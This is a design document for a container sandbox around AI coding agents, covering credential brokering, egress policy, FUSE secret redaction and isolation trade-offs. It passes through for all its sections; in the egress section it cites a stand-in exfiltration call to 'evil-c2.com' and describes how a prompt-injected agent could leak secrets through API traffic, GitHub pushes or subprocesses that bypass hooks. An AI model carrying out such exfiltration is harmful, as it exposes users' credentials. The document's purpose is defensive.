# Future tasks

Planning document. **Nothing here is built.** Everything marked **VERIFY** is an assumption that must be
tested on real hardware before it becomes a plan. The macOS gate (Gate B) is now **resolved by
measurement** (2026-07-23) — it turned the macOS design into a decision (Plans A/H/U, see G3), not a
blocker. The remaining live unknown is Gate A (`ANTHROPIC_BASE_URL` for OAuth).

This rewrite is organised around a set of **hard constraints** the design must now satisfy. An
option that violates one is not "low-rated" — it is **DISQUALIFIED**, regardless of how attractive it
is otherwise. Surviving options are then star-rated for quality.

---

## The hard constraints (the gates)

Every mechanism below is measured against these four first. Three of them are settled decisions, not
open questions.

| Gate | Requirement | Decision |
|---|---|---|
| **CAP** | The **agent** container runs `cap-drop=ALL`. A quarantined sidecar the agent cannot reach *may* hold `CAP_SYS_ADMIN`. | **Settled on Linux** (sidecar, verified). **On macOS it is the open decision** — held only via Colima (Plan A), or relaxed to *capless-at-runtime* with a `SYS_ADMIN`-at-creation window if Colima is refused (Plans H/U). See "macOS: the A/H/U decision". |
| **OS** | Works on **Ubuntu and macOS** from one design. | **Verified 2026-07-23.** Ubuntu native. macOS in-place FUSE is a *measured trade*: `cap-drop=ALL` needs Colima; no-Colima needs a `SYS_ADMIN` cap. Both proven; neither avoidable. |
| **POST** | Redaction covers files **created after launch**, not only files present at start. | **Settled.** Non-negotiable — it is the row where `kib` leads the field. |
| **LIVE** | Preserves the **live, same-absolute-path** project mount Claude's path-keyed configs depend on. | **Settled.** A copy-and-apply model is a different product, not a fix to this one. |

**The decisive consequence.** `CAP` eliminates every in-agent mount mechanism (FUSE-in-container,
overlayfs) outright, and forces the design *toward* the sidecar `kib` already has — the sidecar is the
thing that keeps the agent capless by holding the cap somewhere the agent can't touch. **You cannot
have both `cap-drop=ALL` and the simpler single-container topology.** The `:rslave` propagation,
`fuse_mounted()`, the unmount-ordering rule and the refuse-to-delete-a-live-mountpoint guard are the
*price of quarantining the cap*. That price is now paid deliberately, not reluctantly.

### Grading legend

- **DISQUALIFIED** — violates a hard constraint. The failing gate is named. Not a candidate at any price.
- ★★★★★ … ★☆☆☆☆ — quality among options that pass all four gates.

---

## The four gaps, in priority order

| # | Gap | Today | Prefix |
|---|---|---|---|
| **G1** | Credential readable | Shared OAuth token, same-uid readable, open egress (audit H3/H4) | `C#` |
| **G2** | Egress unrestricted | No control, no opt-in mode | `E#` |
| **G3** | Redaction topology / macOS | FUSE **sidecar** today; cross-container mount propagation blocks macOS | `R#` |
| **G4** | Kernel isolation | Shared host kernel, runc | `K#` |

---

## G1 — Credential (build this first)

**Why first.** Brokering works *even with egress wide open* — the agent cannot exfiltrate a token it
never held. That makes the single largest accepted risk fixable without touching the network, and
without the Portmaster question (Gate D) that has already broken one design. It is host-side and
capless, so it satisfies every gate trivially.

### C1 · Credential broker, base-URL variant ★★★★★ — **PICK · BUILT 2026-07-23 · ON BY DEFAULT 2026-07-25**

> **Status.** Implemented as `kib/broker/` + the `start_broker`/`add_broker_env_args`/
> `connect_broker_network`/`verify_broker_attach`/`stop_broker` subsystem in `host/broker.sh`.
> **Gate A PASSED** (Claude honours `ANTHROPIC_BASE_URL` for OAuth `/v1/messages`) and **Gate D
> PASSED** (container→container on a user bridge under Portmaster), so this is the base-URL variant
> on an internal bridge — no C2/CA, no host-loopback fallback. **On by default** since 2026-07-25
> (`broker = off`, or `KIB_BROKER=0`, disables it). Generic across agents: Claude wired now;
> Codex/Gemini are ready-but-unstarted rows in the `PROVIDERS` table; a header-authed MCP (C3) is the
> same shape. Fail-hard on create (broker is core auth); fail-safe on mid-session crash (never
> re-mount the real token).
>
> **REVISED 2026-07-23 — the brokered credential is STATIC.** The first cut brokered the live
> `~/.claude-shared/.credentials.json` and owned OAuth refresh on a 30 s timer. Shipped, it logged
> the account out and paged every 30 s: Anthropic's subscription refresh tokens are single-use and
> rotate, so the broker invalidated the token family for the host CLI and every other project's
> sidecar; the write-back to a single-file bind mount could not use `rename(2)` (EBUSY) so it
> truncated in place; and `threading.Lock` does not serialise across the one-broker-per-project
> containers. VERIFY #1 (the refresh contract) is therefore **withdrawn, not deferred** — there is
> no refresh path to verify. The broker now injects a long-lived token from
> `~/.keep-it-in-your-box/claude-token` (`kib broker login`, mode 600, mounted `:ro`), the
> placeholder is **synthetic** rather than cloned from the real credential, and the broker has no
> write path to any credential at all. Same conclusion yoloAI reached independently.

A host-side broker process holds the real token. The agent gets `ANTHROPIC_BASE_URL` pointed at the
broker plus a **structurally valid placeholder** credential. The broker terminates the agent's
plain-HTTP connection and makes its own HTTPS call upstream — **no TLS MITM, no CA in the container
trust store.** Proven three times in the field: yoloAI's broker, sandbox-runtime's sentinel, and
Docker Sandboxes' header injection ("the session token stays on your host and is never stored inside
the sandbox").

| Gate | Result |
|---|---|
| CAP | ✅ broker is host-side; agent needs nothing |
| OS | ✅ container→container on a bridge — identical on Ubuntu and macOS |
| POST / LIVE | n/a (not a filesystem mechanism) |

**Login and refresh — the part the old draft omitted.** Subscription auth is OAuth 2.0 + PKCE, and
only the steady-state API call goes through `ANTHROPIC_BASE_URL`:

| Step | Endpoint | Honours `ANTHROPIC_BASE_URL`? |
|---|---|---|
| Authorize (browser) | `claude.ai/oauth/authorize` | No — browser-driven |
| Token exchange + **refresh** | OAuth token endpoint | No — auth path, not the API base |
| `/v1/messages` | `api.anthropic.com` | Yes — this is all the broker rewrites |

So the broker cannot "log in" for the agent, and the access token expires in hours. The resolution —
which every field implementation uses — is **the sandbox never logs in**:

- `/login` happens **once, host-side, by a human in a browser.** The result is the existing shared
  `~/.claude-shared/.credentials.json` (already how `kib` stores it, via `CLAUDE_SECURESTORAGE_CONFIG_DIR`).
- The broker **owns refresh**: it holds the refresh token, watches expiry, and refreshes against the
  OAuth endpoint itself, updating its own copy. The agent keeps sending its placeholder; the broker
  always injects a currently-valid access token.
- The change to `kib`: **stop mounting `.credentials.json` into the container.** The broker reads it
  host-side and injects on egress. `/login` inside a sandbox is disabled with a message pointing the
  user at the host.
- **The placeholder is not "no credential."** Claude Code parses and expiry-checks `.credentials.json`
  locally before making a request and may refuse to start on garbage. The placeholder must be a
  well-formed, non-expired *fake* token — exactly sandbox-runtime's `fake_value_<uuid4>` shape.

**Tension to resolve:** `validate_shared_settings` currently refuses `env.ANTHROPIC_BASE_URL` as a
poisoning vector. `kib` setting it is fine; the rule needs a carve-out distinguishing "kib set this"
from "a repo set this."

**Contingent on Gate A** — does Claude Code honour `ANTHROPIC_BASE_URL` in subscription/OAuth mode? If
not, C1 can't intercept and C2 is the fallback.

### C2 · Credential broker, sentinel + TLS-terminating proxy ★★★★☆ — **fallback if Gate A fails**

sandbox-runtime's model. The real value is replaced inside the box with `fake_value_<uuid4>`; a
host-side proxy substitutes sentinel→real on egress. Works **regardless of the base URL**, because it
intercepts wherever the request actually goes — so it survives Claude pinning its auth endpoints. Cost:
it "**requires TLS termination**" (the proxy must read/rewrite the `Authorization` header), which means
a CA in the container trust store. Passes all gates; strictly more machinery than C1.

### C3 · Generic authenticating reverse-proxy for third-party MCP servers ★★★★★ — **BUILT 2026-07-23**

> **BUILT — what shipped (differs from the sketch below in three ways):**
> 1. **No separate `mcp-broker.py`.** It is the *same* `kib/broker/`, extended: a new
>    `reverse_proxy_mcp` delivery mode + a registry row. **Providers are user-extensible — any MCP, no
>    code change:** **only the LLMs (`claude`/`codex`/`gemini`) are built in — no MCP is hardcoded.**
>    DataForSEO and mcp-gsc ship as copy-in example defs in `examples/providers/`, and `kib/broker/`
>    folds `~/.keep-it-in-your-box/providers.d/*.json` onto the built-ins (`_merge_user_providers`, mounted
>    `:ro` into the sidecar; the LLM built-ins non-overridable). `kib mcp adopt` *synthesizes* such a def
>    from an inline `claude mcp add --header …` entry, and `kib mcp add` declares one directly. `serve()`
>    already looped providers and streamed unbuffered, so the relay
>    needed no change — the agent's `.mcp.json` URL carries the upstream path (`…:<port>/http`) and the
>    broker forwards it verbatim. Resolves the two open C3 questions below: **plain HTTP** to the broker
>    works (no CA), and **streaming is already unbuffered** (`_do_relay` reads-to-EOF, flushes per chunk).
> 2. **Shape C added (not in the original C3 scope):** a `hosted_mcp` mode for MCPs whose secret can't be
>    header-injected — client-signed / file creds like **mcp-gsc**'s Google service-account JSON. The MCP
>    *server* runs in its own `cap-drop=ALL` sidecar (`start_hosted_mcp`, supergateway bridging stdio→HTTP)
>    holding the credential; the agent reaches it over the broker net at `http://<id>:<port>`. Trade: the
>    MCP server's own code runs in that sidecar (isolated from the agent, but trusted).
> 3. **Unified UX:** `kib broker login <name>` / `--logout <name>` / `--status` (registry-driven, generalizing
>    `--broker-login`) add any credential the Anthropic-token way — kib fails-hard on a missing *required*
>    cred and prints the exact fix. See CLAUDE.md "Credential broker" for the delivery-mode reference.
>
> The design record below stands as written.

The **same principle as C1's base-URL variant**, applied to remote HTTP MCP servers (DataForSEO is the
first consumer) rather than the Anthropic token. A quarantined sidecar holds the third-party credential
and injects it on egress, so the agent container never holds it.

**Mechanism — fixed-upstream reverse proxy, not a forward proxy.** The MCP transport is HTTPS to a
known endpoint with a static `Authorization` header, so the broker is a reverse proxy hardcoded to
**one** upstream:

```
agent container ──http──▶ broker sidecar ──https + Authorization──▶ <one fixed upstream>
   (no secret)   internal    (holds token)      re-originated TLS
      bridge
```

The plugin's `.mcp.json` points `url` at the broker over plain HTTP on an internal bridge **with no auth
header**; the broker terminates that connection, injects `Authorization`, and makes its own HTTPS call
upstream. **No TLS MITM, no CA in the container trust store** — C1's property, not C2's cost — available
here because the credential is a *static header*, not a rotating OAuth token pinned to `api.anthropic.com`.

| Gate | Result |
|---|---|
| CAP | ✅ broker is a capless sidecar; agent needs nothing |
| OS | ✅ plain container→container bridge — Docker Desktop / OrbStack / Colima / Linux identical; no FUSE, no propagation, no Plan-H split |
| POST / LIVE | n/a (not a filesystem mechanism) |

**Generic, parameterized (decided).** One component, two knobs: `MCP_UPSTREAM` (the fixed upstream
origin) and `MCP_AUTH` (the header value, read from a host-only file at broker creation). One broker
instance per authed MCP; DataForSEO sets `MCP_UPSTREAM=https://mcp.dataforseo.com` + a `Basic <token>`
header. Reusable for any future header-authed remote MCP, which is why it is worth building generic now.

**Where the token lives:**

| Party | Holds the token? |
|---|---|
| Agent container (env, files, `/proc`) | **No** — only the broker URL |
| Broker sidecar (separate namespace) | Yes, in memory/env |
| Host | Yes, `600` file / keychain, **not** mounted into the agent |

`kib` reads the host-only file and passes it to the **broker's** env at creation, never to the agent
container. A fully compromised agent can *use* the MCP through the broker but **cannot read the
credential** — the win holds with egress wide open, same as C1.

**Lifecycle & shape (mirrors existing sidecars).** A bind-mounted `mcp-broker.py` (streaming reverse
proxy — MCP http transport is streamable/SSE, so **no response buffering**), on a dedicated internal
bridge joining main + broker, with its own egress to the upstream. Created/torn down with the main
container under the boot lock, like the Wayland/FUSE sidecars. **Fail-soft** (like the Wayland guard,
unlike the FUSE sidecar): if the broker can't start, the MCP simply doesn't connect — it is not a
host-security control, so aborting the launch would be wrong.

**Delivery — the secret-free plugin dissolves the global-vs-secret tension.** With the token out of the
container, the plugin config is genuinely secret-free (`url` → broker, no header), so it is **safe to
install shared/global** — there is nothing to propagate. Whether it authenticates in a given project is
gated by whether kib started the broker for that launch, not by a secret in every container.
Delivery of that plugin uses the friendly `--unlock-shared` path below.

**Residual risks (named).**
- **API abuse, not credential theft.** The agent can still *make* upstream calls through the broker
  (burn quota/spend). Brokering protects the credential, not the account — **use a dedicated,
  spend-capped key** per upstream.
- **The broker is trusted code** holding the token — keep it minimal, in-repo, reviewed; same trust
  class as the other sidecars.
- **Fixed-upstream is load-bearing.** A forward proxy would be an egress bypass; the reverse proxy only
  ever reaches its one hardcoded upstream.

### C4 · Secret-in-config detector (host-side, advisory) ★★★☆☆ — **BUILT 2026-07-23**

> **BUILT:** `warn_inline_mcp_secrets` runs on every launch (create + attach) and warns — never blocks —
> when an MCP entry in the project `.mcp.json` or this session's `.claude.json` carries an inline auth
> header or a secret-shaped `env` value, naming the server + reason and **never printing the value**.
> Entries kib itself brokered (`_kibBroker`) are skipped. Companion `kib mcp adopt <name>` migrates an
> inline remote-MCP credential into the broker: it stores the secret host-side (mode 600), strips it from
> the config, and lets the next launch inject a header-free brokered entry. It refuses a local/stdio MCP
> (needs a `hosted_mcp` row) or an unknown upstream. The heuristic (open question below) is intentionally
> conservative — key/token/secret env-name match + `Bearer`/`Basic` header shape — so it doesn't cry wolf.
>
> **EXTENDED 2026-07-24 — detection → PREVENTION (`intercept_mcp_add`):** the detector alone can't stop
> the common leak. A user who won't learn `kib mcp add`/`--mcp-adopt` takes a vendor's own
> `claude mcp add … --header "Authorization: …" …` line and swaps `claude`→`cc`; run verbatim, that puts
> the raw secret in the **container's argv** before any warning fires — nothing in-box can undo it. So `kib`
> now intercepts `[claude] mcp add|add-json` **host-side, before the `docker exec`**: the remote `--header`
> form is **auto-brokered** (secret peeled off, stored mode-600, header-free route written — never enters
> the box), the local/stdio `--env`-secret form is **blocked** (opt-out `KIB_ALLOW_INLINE_MCP_SECRET=1`), and
> anything else passes through. `warn_inline_mcp_secrets` stays as the backstop for secrets that arrive some
> other way (an edited config, a teammate's commit). This makes C4 a *preventer* for the swap path, not only
> a detector.

A host-side scan in `kib` at launch — sibling to `validate_shared_settings` — that reads the
container-visible config about to be mounted and **warns** when a **literal** credential is present,
recommending migration to the C3 broker. **Advisory, not blocking** (decided): it names the file/field
and the fix, then continues — consistent with the don't-break-workflows stance, and it is a *detector*
like the pre-commit git-config audit, not a *preventer* like the FUSE guard.

**Scans (host-side, at launch):** `.mcp.json`, plugin `plugin.json` / `.mcp.json`, `.claude.json`
`mcpServers` (url/headers/env/args), `settings.json` `env`. **Flags** auth-shaped literals:
`Authorization: Basic|Bearer <literal>`; `*_API_KEY` / `*_TOKEN` / `*_SECRET` set to a literal value;
high-entropy / base64 blobs in those fields.

| Gate | Result |
|---|---|
| CAP / OS | ✅ host-side scan; no container change, portable across engines |
| POST / LIVE | n/a |

**Known blind spot (documented, not solved).** A `${VAR}` reference is treated as clean — but
"reference ≠ safe": it is safe only if it resolves to the **broker**, and it could resolve to an
in-container forwarded secret (the reverted `CC_FORWARD_ENV` + `${DATAFORSEO_B64}` did exactly that).
The detector cannot infer resolution from config text alone, so it under-warns on
`${VAR}`-to-forwarded-secret. Accepted: the loud case — a literal token pasted into config — is the
common one; the reference case is caught by the reviewer and by C3 being the paved path. **Not a
boundary** — it complements, not replaces, the agent-level secrets hard-stop and `validate_shared_settings`.

### Shared-plugin install UX — friendly `--unlock-shared` guidance

**Per-project** `/plugin install` already works (lands in `$CLAUDE_CONFIG_DIR` via the farm). The gap is
the **shared/all-projects** install, which writes to the `:ro` `~/.claude-shared/plugins/` and returns a
raw `EACCES`. Intercept that specific failure and print the **existing** unlock-shared block (already in
CLAUDE.md's EACCES message) — "to install a plugin for EVERY project, close every session and relaunch
with `kib unlock-shared`" — so the flag is discoverable rather than folklore. No new command surface
(decided: friendly error, not a `kib plugin add` subcommand); per-project install stays silent and
working. This is the delivery on-ramp for C3's secret-free broker plugin.

### Rejected baseline

Mounting the live `.credentials.json` into the agent (today's behaviour) is the H3/H4 risk itself, not
an option.

---

## G2 — Egress (DELAYED-OR-NEVER — the broker, not a firewall, is the fix)

> **Status decision (2026-07-23): delayed-or-never, on purpose.** An egress firewall does not earn
> its complexity, because the two channels that make exfil trivial **cannot be closed**:
> - **You are already sending secrets to Anthropic.** Exposing a credential to the agent *is* putting
>   it on the wire to `api.anthropic.com` — encodable into the agent's own prompt/tool-call content.
>   That channel is load-bearing and bidirectional; an allowlist cannot touch it.
> - **GitHub and the registries must stay open**, and they are full of bad code and prompt-injection
>   payloads *inbound* while being a trivial exfil path *outbound* (push to your own repo / gist /
>   branch name). Allowing them — which the workflow requires — hands the adversary a route out.
>
> So the real fix is **C1 (broker): remove the thing worth stealing.** A filtering proxy is only ever
> a speed-bump against a *naive/accidental* agent, off by default, and buys little on top of the
> broker. E1 below is kept as a design record, **not** as planned work. Revisit only if a concrete
> unattended-run scenario makes the accident-class blast-radius reduction worth the sidecar.

**Reframe first, because it changes the rating.** An egress allowlist is **not an exfiltration
boundary** and the doc must not imply it is:

- **`api.anthropic.com` must stay open and is itself a bidirectional exfil channel** — an injected
  agent can encode secrets into its own tool-call/prompt content. This channel can never be closed.
- **`github.com` and the package registries must be allowed** for the agent to work — and the moment
  they are, exfil is trivial (push to your own repo, a gist, a branch name). GitHub is also untrusted
  *inbound*: it hosts arbitrary prompt-injection payloads and binaries.
- The field agrees unprompted (fence: *"if you allow a domain, code can exfiltrate via that domain"*).

So egress control is a **speed-bump against the accidental / naive case** (an errant agent tricked into
`curl evil-c2.com/exfil` where the C2 domain isn't allowed) and a blast-radius reducer for unattended
runs — **not** a control against a determined adversary. The real fix for exfil is C1: remove the thing
worth stealing. Egress is defence-in-depth on top.

**What survives an allowlist:** `WebSearch` is **server-side** — the query and results traverse
`api.anthropic.com`, so it works behind an `api.anthropic.com`-only list. **What breaks:** `npm`/`pip`/
`cargo`/`apt`, `git clone` from arbitrary forges, binary downloads, and client-side fetches. That is
exactly why egress is **opt-in, off by default** — default-deny conflicts with building untrusted repos
that fetch from arbitrary registries. **VERIFY:** whether `WebFetch` is server-side (like `WebSearch`,
so it survives) or a client-side fetch (so it breaks under an allowlist).

### E1 · Filtering proxy as the only route out, opt-in ★★★★☆ — **DESIGN RECORD ONLY (not planned; see G2 status)**

Agent container gets no default route; all egress via an HTTP/SOCKS proxy with a domain allowlist. The
fence / sandbox-runtime model.

| Gate | Result |
|---|---|
| CAP | ✅ proxy is a sidecar; the agent just loses its route — no cap needed |
| OS | ✅ container→container on a bridge |
| POST / LIVE | n/a |

- **Same component as the C1 broker** — one sidecar, not two. This co-location is most of the rating;
  its *security* contribution alone is "accident speed-bump," so it is ★★★★ as a cheap add-on, not as a
  boundary.
- **Composes with gVisor** (K2), unlike anything iptables-based.
- **VERIFY (Gate D): Portmaster.** The host firewall silently *held* `container→gateway:53` during the
  DNS work. Container→container on a bridge is a different, forwarded path and should be fine — but that
  assumption already burned one design.
- DNS stays open, so DNS tunnelling remains — consistent with the field (out of scope everywhere).

### E2 · iptables / ipset allowlist inside the container — **DISQUALIFIED (CAP)**

yoloAI's and aicontainer's approach. Needs `CAP_NET_ADMIN` in the agent container to install rules —
a direct `cap-drop=ALL` violation. Independently, it is **a silent no-op under gVisor** (runsc's
userspace netstack ignores iptables), which would foreclose K2. Two reasons, either fatal.

### Rejected baseline

Open egress (today) — the accepted-risk position. E1 makes an opt-in available without cost when off.

---

## G3 — Redaction topology and macOS

**Baseline today:** `kib/guest/fuse.py` runs in a **separate sidecar container** (`--cap-add=SYS_ADMIN
--device /dev/fuse`, as the host uid). It mounts the redacted view at `/tmp/kib-fuse.<hash>/mnt`; the
**main container bind-mounts that back over `$PWD` with `:rslave`.** That two-container mount hand-off
is the source of the `/tmp`-shared precondition, the `:rslave` propagation, `fuse_mounted()`, the
unmount-ordering rule and the never-`rm`-a-live-mountpoint guard — and it is the only thing standing
between `kib` and macOS.

### R1 · Keep the quarantined FUSE sidecar, extend it to macOS ★★★★★ — **PICK**

The FUSE server stays in its own container with `CAP_SYS_ADMIN` + `/dev/fuse`. The **agent container
stays `cap-drop=ALL`** — the cap is in a container the agent has no handle to (different PID and mount
namespace). This is the *only* mechanism that passes all four gates.

| Gate | Result |
|---|---|
| CAP | ✅ cap is in the sidecar; agent is capless |
| OS | ✅ Ubuntu native; **macOS via Colima — verified 2026-07-23** (Docker Desktop cannot; see below) |
| POST | ✅ FUSE sees the `create()` call — covers files created after launch |
| LIVE | ✅ redacted view mounted at the same absolute `$PWD` |

**Why the sidecar beats the alternatives on safety, not just on the gates.** The unredacted files live
in *another container's namespace* — unreachable **by construction**, no matter what the agent does to
the mount. Every in-agent scheme (R2, R4) instead leaves the real files in the agent's own namespace,
hidden only by permissions and missing caps — a weaker, more assumption-laden boundary, and the exact
surface behind CVE-2023-0386 ("GameOver(lay)").

**macOS — resolved by measurement (verified 2026-07-23, Docker Desktop 4.78.0 / Colima 0.10.3).** The
open question was whether the sidecar→agent mount hand-off survives macOS. It does **not** on Docker
Desktop and **does** on Colima:

- **Docker Desktop — ruled out.** Bind sources resolve to the macOS host through the `/host_mnt`
  file-sharing layer, which is neither shared nor slave, so the daemon **refuses the `rshared`/`rslave`
  mount config outright** (`path /host_mnt/private/... is mounted on /host_mnt/private but it is not a
  shared mount`). The LinuxKit VM root is `private`. No setting fixes this — it is structural to Desktop's
  file sharing. *(The earlier hope that "one shared-kernel VM" would make propagation work like Linux was
  wrong: the barrier is the file-sharing layer between the macOS host and that VM, not the kernel.)*
- **Colima — works, and behaves like a real Ubuntu host.** VM root is `shared`; a tmpfs mounted in one
  container is read back through the marker in a second container (`COLIMA-PROPAGATION-OK`); `/dev/fuse`
  is present, the kernel lists `nodev fuse` in `/proc/filesystems`, and a real `bindfs` passthrough
  mounts and serves a read (`COLIMA-FUSE-MOUNT-OK`). The agent container stays `cap-drop=ALL`.

**Docker Desktop cannot do `cap-drop=ALL` FUSE by *any* mechanism** — both were measured, both blocked:
the two-container sidecar (propagation refused, above) *and* a single-container unprivileged user
namespace (kernel refuses the `uid_map` write — `unshare: write failed /proc/self/uid_map: Operation
not permitted`; LinuxKit locks down unprivileged userns). So on macOS, in-place FUSE with a truly
capless agent-at-creation exists **only inside a real Linux VM**. That is **Plan A**: `kib`'s existing
sidecar, hosted by Colima (or Lima/Rancher — same VM class), adding no macOS-specific code and no second
FUSE backend. It is not "adding a VM": a Mac already runs a Linux VM for Docker at all — Colima
*replaces* Desktop's VM with one whose root is shared. Its only cost is the Colima dependency, which is
the whole subject of the A/H/U decision at the end of this section.

**No new flags needed.** `kib`'s existing sidecar config (the `host/` units) is exactly what the test used and
what works on Colima: `--cap-drop=ALL --cap-add=SYS_ADMIN --device /dev/fuse --security-opt
apparmor=unconfined`. The AppArmor exception is load-bearing on any AppArmor-enforcing host —
`docker-default` denies `mount` even with `CAP_SYS_ADMIN`, which is why a bare `--cap-add SYS_ADMIN`
test first failed with `fuse: mount failed: Permission denied`. Colima's Ubuntu VM enforces AppArmor
exactly like a native Ubuntu host, so the same exception kib already ships covers both.

**Honest cost, restated:** the propagation complexity does **not** go away under this plan. It is the
price of `cap-drop=ALL`. The "delete the sidecar" simplification was only ever purchasable with
`CAP_SYS_ADMIN` in the agent container, which is now ruled out.

### R2 · FUSE inside the main container — DISQUALIFIED at creation, but the **no-Colima macOS path** (verified)

Mounting FUSE in the agent's own container needs `CAP_SYS_ADMIN` there, so it fails `CAP` *as written*
(`cap-drop=ALL`-at-creation). But it is the only in-place FUSE that **works on Docker Desktop** — verified
2026-07-23: a single container with `--cap-drop=ALL --cap-add SYS_ADMIN --device /dev/fuse --security-opt
apparmor=unconfined` mounted a real `bindfs` passthrough and served a read (`DD-SYSADMIN-FUSE-OK`). No
propagation, no userns, so Docker Desktop's two blocks don't apply.

**Hardened, the agent is still capless at runtime.** The container is *created* with `SYS_ADMIN`; the
trusted entrypoint does the one `mount(2)`, then `PR_CAPBSET_DROP`s `SYS_ADMIN` out of the bounding set
and `gosu`s to the agent, which runs with an empty cap set under `no-new-privileges` and cannot regain
it. `SYS_ADMIN` exists only during the pre-agent window. Residual gaps vs the sidecar: the container is
*created* cap-capable (visible in `docker inspect`), and the real files sit in the agent's namespace
under the FUSE overlay — redaction rests on source-hiding (root-700 path, dedicated non-agent uid)
rather than being unreachable-by-construction. This is the R2-class weakness, and the surface behind
CVE-2023-0386 ("GameOver(lay)").

This is the engine of **Plans H and U** (no Colima). *(Precedent, stated accurately: yoloAI did **not**
retire its overlay mode — it ships `:overlay` as an opt-in that requires `CAP_SYS_ADMIN`, alongside a
capless `:copy` default. Nobody in the field does in-agent redaction without either the cap or a copy.)*

### R3 · Landlock — **DISQUALIFIED (OS, and cannot express the requirement)**

Unprivileged, so it passes CAP — but Linux-only (macOS would need a separate Seatbelt backend,
violating one-design/OS), and Landlock **cannot deny a subpath inside an allowed directory**. The
project dir must be writable and `.env` inside it denied — Landlock literally cannot express that. This
is precisely why cplt's `.env` protection is not kernel-enforced on Linux, documented in its own
SECURITY.md. No content masking either.

### R4 · Overlayfs with masked upper layer — **DISQUALIFIED (CAP + POST)**

Needs `CAP_SYS_ADMIN` for the mount (fails CAP), *and* the mount is composed at mount time so a
`.env.production` created after launch lands unmasked (fails POST).

### R5 · `/dev/null` bind masks (fence's mechanism) — **DISQUALIFIED (POST)**

The Docker daemon does the bind, so the agent stays `cap-drop=ALL` and it is portable — but a bind
mount **cannot cover a file that does not exist yet**. sandbox-runtime documents this against itself
(*"mandatory deny paths only block files that already exist"*). Fails POST, the row where `kib` leads.

### R6 · Copy-in / copy-out (yoloAI `:copy`) — **DISQUALIFIED (LIVE)**

Capless, portable, covers after-launch files inside the copy — but discards the same-absolute-path live
mount Claude's path-keyed configs depend on, and adds an apply step that is a new failure surface. A
different product. Fails LIVE.

### R7 · Tool-layer denial via hooks — passes gates, ★★☆☆☆ as a *layer* only

aicontainer's `PreToolUse` hook refusing `Read`/`Edit`/`Write`/`Grep`/`Glob` on `.env*`. Capless,
portable, and covers after-launch files by checking the path at call time — so it passes all four gates.
But it is **not a boundary**: any subprocess bypasses it, and aicontainer's own CHANGELOG documents
three patched bypasses. Worth adding **on top of R1/R2** as cheap defence-in-depth; worthless as the
mechanism.

### macOS: the A/H/U decision (RESOLVED 2026-07-23 → H; implemented)

Docker Desktop cannot honour `cap-drop=ALL` for in-place FUSE (both mechanisms measured-blocked). So the
two priorities — *fewer dependencies* and *`cap-drop=ALL`* — are **mutually exclusive on macOS**, and one
must give. Three coherent plans:

| Plan | Linux | macOS | Trade |
|---|---|---|---|
| **A** | `cap-drop=ALL` sidecar (R1) | same sidecar in **Colima** | Both constraints held; costs the **Colima dependency**. Strongest isolation. |
| **H** *(recommended)* | `cap-drop=ALL` sidecar (R1), unchanged | hardened single-container FUSE (R2) | **No Colima.** Linux not regressed. macOS agent *capless-at-runtime* but not `cap-drop=ALL`-at-creation; source in-namespace. Two FUSE launch paths (share `kib/guest/fuse.py`). |
| **U** | hardened single-container FUSE (R2) | hardened single-container FUSE (R2) | **No Colima, no sidecar** — deletes all propagation complexity. But Linux **regresses** from the verified `cap-drop=ALL` sidecar; source in-namespace everywhere. |

**Recommendation: H.** It is the only plan that removes the Colima dependency *without* regressing Linux
(which already has the working `cap-drop=ALL` sidecar for free) and *without* handing the untrusted agent
any capability on macOS (hardened drop-after-mount). The cost is a second, simpler FUSE launch path on the
one platform where the kernel gives no better option. **U** is tempting only if deleting the sidecar
outright matters more than Linux's maximal isolation — it spends a real, working security property to
simplify. **A** is right if the Colima install is acceptable and maximal isolation on macOS is wanted.

Evidence is in "Verification gates". This is the last open architectural decision for G3.

---

## G4 — Kernel isolation (third-ranked; do the cheap portable piece, defer the rest)

**Why third at all.** It is the one gap where the field agrees the control is *not a boundary anyway*
(fence: *"assume determined attackers may escape via kernel/OS vulnerabilities"*; Claude Code's docs:
*"Sandboxing reduces risk but is not a complete isolation boundary"*). A microVM also closes **none** of
`kib`'s documented risks — those cross through files the host executes later, orthogonal to hardware virt.

### K1 · Tighter custom seccomp profile ★★★☆☆ — **PICK (now)**

Docker's default blocks ~44 syscalls; a custom profile blocks more. Capless, portable, no new
dependency, no macOS complication, no interaction with C1/E1/R1. Modest ceiling — it hardens the
existing boundary rather than moving it — near-zero risk. Passes every gate.

### K2 · gVisor (`runsc`) — Linux-only opt-in, ★★☆☆☆, deferred until R1 is proven

One line in `docker run`. Collapses the host syscall surface substantially, no KVM, no guest kernel.
Three load-bearing caveats: **VERIFY** `runsc`'s FUSE support is incomplete and gated — if it can't
service `/dev/fuse` the way R1 needs, gVisor is dead for `kib`; yoloAI documents Claude Code hanging in
`epoll_pwait` under gVisor on macOS; and runsc **ignores iptables** (a reason E2 is a no-op there, and a
reason to prefer the E1 proxy). Linux-only, so it fails OS as a *unified* answer — hence opt-in, not
default, and sequenced **after** R1 so the FUSE-compat check is a five-minute test against a working
system rather than a design assumption.

### K3 · Kata + Firecracker microVM — **DISQUALIFIED (OS) as a kernel-isolation goal**

Needs KVM (unavailable under Docker Desktop on macOS without nested virt), a virtio-fs tax, and a guest
kernel to patch — and closes none of the documented risks. **Distinct from R1's macOS fallback:** there,
a microVM is a *substrate to host the Linux sidecar*, not a kernel-isolation feature bought for its own
sake.

### K4 · runc (today) — baseline.

---

## The recommended stack, and the order to build it

1. **C1 — credential broker** *(new work; biggest risk; capless; no Portmaster dependency)*.
   Ship the base-URL broker with host-side login, broker-owned refresh, and a valid-looking placeholder;
   keep C2 (sentinel + TLS-MITM) ready if Gate A fails. **Third-party MCP creds ride the same
   principle — C3** (generic authenticating reverse-proxy sidecar; DataForSEO first), with **C4**
   (host-side, advisory secret-in-config detector) nudging config off the in-container-secret
   anti-pattern and the friendly `--unlock-shared` install path delivering the secret-free plugin.
2. **R1 — the FUSE sidecar on Linux** *(exists, unchanged)*. **macOS is the open A/H/U decision**
   (recommendation **H**: hardened single-container FUSE, no Colima; Linux keeps the sidecar). Add R7
   hooks on top as cheap defence-in-depth.
3. ~~**E1 — opt-in filtering proxy**~~ **DELAYED-OR-NEVER** (see G2). The broker (C1), not a firewall,
   is the exfil fix; an allowlist can't close `api.anthropic.com` or the registries, which is where
   exfil actually happens. Design kept on record; not scheduled.
4. **K1 — tighter seccomp** *(now)*; **K2 gVisor** as a Linux-only opt-in once R1 proves `/dev/fuse`
   works.

**One-line summary:** the host-side broker fixes credentials; egress is **delayed-or-never** (an
allowlist can't close `api.anthropic.com` or the registries, so the broker — removing the secret — is
the only real fix). Redaction is the FUSE sidecar on Linux (`cap-drop=ALL`, verified). **macOS forces
